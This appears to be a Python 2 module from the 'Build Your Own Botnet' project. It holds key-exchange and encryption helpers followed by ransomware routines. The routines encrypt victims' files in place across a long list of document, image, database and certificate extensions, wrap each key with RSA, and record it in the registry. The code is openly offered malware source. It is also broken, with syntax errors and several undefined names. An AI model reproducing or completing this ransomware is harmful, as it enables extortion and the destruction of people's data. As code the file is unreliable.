#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard library

import os
import sys
import json
import struct
import base64
import socket
import urllib
import cStringIO
import httpimport

# byob

import util

# remote imports

with httpimport.remote_repo(['Crypto','Crypto.Util','Crypto.Cipher.AES','Crypto.Hash.HMAC','Crypto.Hash.MD5','Crypto.PublicKey.RSA','Crypto.Cipher.PKCS1_OAEP'], base_url='http://localhost:8000'):
    for module in ['Crypto','Crypto.Util','Crypto.Cipher.AES','Crypto.Hash.HMAC','Crypto.Hash.MD5','Crypto.PublicKey.RSA','Crypto.Cipher.PKCS1_OAEP']:
        try:
            exec "import %s" % module
        except ImportError:
            util.debug("Error: unable to import '%s'" % module


def diffiehellman(connection):
    if isinstance(connection, socket.socket):
        try:
            g  = 2
            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
            xA = pow(g, a, p)
            connection.send(Crypto.Util.number.long_to_bytes(xA))
            xB = Crypto.Util.number.bytes_to_long(connection.recv(256))
            x  = pow(xB, a, p)
            return Crypto.Hash.MD5.new(Crypto.Util.number.long_to_bytes(x)).hexdigest()
        except Exception as e:
            util.debug("{} error: {}".format(diffiehellman.func_name, str(e)))
    else:
        util.debug("{} erorr: invalid input type - expected '{}', received '{}'".format(diffiehellman.func_name, socket.socket, type(connection)))

def encrypt_aes(data, key):
    try:
        cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        output = b''.join((cipher.nonce, tag, ciphertext))
        return base64.b64encode(output)
    except Exception as e:
        util.debug("{} error: {}".format(encrypt.func_name, str(e)))

def decrypt_aes(data, key):
    try:
        data = cStringIO.StringIO(base64.b64decode(data))
        nonce, tag, ciphertext = [ data.read(x) for x in (Crypto.Cipher.AES.block_size - 1, Crypto.Cipher.AES.block_size, -1) ]
        cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)
    except Exception as e1:
        util.debug("{} error: {}".format(decrypt.func_name, str(e1)))
        try:
            return cipher.decrypt(ciphertext)
        except Exception as e2:
            return "{} error: {}".format(decrypt.func_name, str(e2))

def encrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding='\x00'):
    data    = bytes(data) + (int(block_size) - len(bytes(data)) % int(block_size)) * bytes(padding)
    blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
    vector  = os.urandom(8)
    result  = [vector]
    for block in blocks:
        block   = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, block))
        v0, v1  = struct.unpack("!2L", block)
        k       = struct.unpack("!4L", key[:key_size])
        sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
        for round in range(num_rounds):
            v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
            sum = (sum + delta) & mask
            v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
        output  = vector = struct.pack("!2L", v0, v1)
        result.append(output)
    return base64.b64encode(bytes().join(result))

def decrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding='\x00'):
    data    = base64.b64decode(data)
    blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
    vector  = blocks[0]
    result  = []
    for block in blocks[1:]:
        v0, v1 = struct.unpack("!2L", block)
        k = struct.unpack("!4L", key[:key_size])
        delta, mask = 0x9e3779b9L, 0xffffffffL
        sum = (delta * num_rounds) & mask
        for round in range(num_rounds):
            v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
            sum = (sum - delta) & mask
            v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
        decode = struct.pack("!2L", v0, v1)
        output = str().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, decode))
        vector = block
        result.append(output)
    return str().join(result).rstrip(padding)

def encrypt_file(filepath, key):
    try:
        if os.path.isfile(filepath):
            with open(filepath, 'rb') as fp:
                plaintext = fp.read()
            ciphertext = encrypt(plaintext, key)
            with open(filepath, 'wb') as fd:
                fd.write(ciphertext)
            return filepath
        else:
            return "File '{}' not found".format(filepath)
    except Exception as e:
        util.debug("{} error: {}".format(encrypt_file.func_name, str(e)))

def decrypt_file(filepath, key):
    try:
        if os.path.isfile(filepath):
            with open(filepath, 'rb') as fp:
                ciphertext = fp.read()
            plaintext = decrypt(ciphertext, key)
            with open(filepath, 'wb') as fd:
                fd.write(plaintext)
            return filepath
        else:
            return "File '{}' not found".format(filepath)
    except Exception as e:
        util.debug("{} error: {}".format(decrypt_file.func_name, str(e)))

def encrypt_files(args):
    try:
        if os.path.splitext(path)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp','.py','.php','.html','.css','.js','.rb','.xml']:
            aes_key = Crypto.Hash.MD5.new(Crypto.Ransom.get_random_bytes(16)).hexdigest()
            ransom  = encrypt_file(path, key=aes_key)
            cipher  = Crypto.Cipher.PKCS1_OAEP.new(ransom.pubkey)
            key     = base64.b64encode(cipher.encrypt(aes_key))
            
            util.registry_key(ransom, path, key)
            util.debug('{} encrypted'.format(path))
            
            if not len([k for k in workers if 'encrypt-files' in k if workers[k].is_alive()]):
                rnd = random.randint(1,100)
                workers['encrypt-files-{}'.format(rnd)] = threading.Thread(target=threader, args=(jobs,), name=time.time())
                workers['encrypt-files-{}'.format(rnd)].daemon = True
                workers['encrypt-files-{}'.format(rnd)].start()
    except Exception as e:
        util.debug("{} error: {}".format(_encrypt.func_name, str(e)))


def decrypt_files(args):
    try:
        rsa_key, aes_key, path = args
        cipher  = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
        aes     = cipher.decrypt(base64.b64decode(aes_key))
        result  = decrypt_file(path, key=aes)
        util.debug('%s decrypted' % result)
        if not len([k for k in workers if 'ransom' in k if workers[k].is_alive()]):
            rnd = random.randint(11,99)
            workers['decrypt-files-{}'.format(rnd)] = threading.Thread(target=threader, args=(jobs,), name=time.time())
            workers['decrypt-files-{}'.format(rnd)].daemon = True
            workers['decrypt-files-{}'.format(rnd)].start()
    except Exception as e:
        util.debug("{} error: {}".format(decrypt.func_name, str(e)))
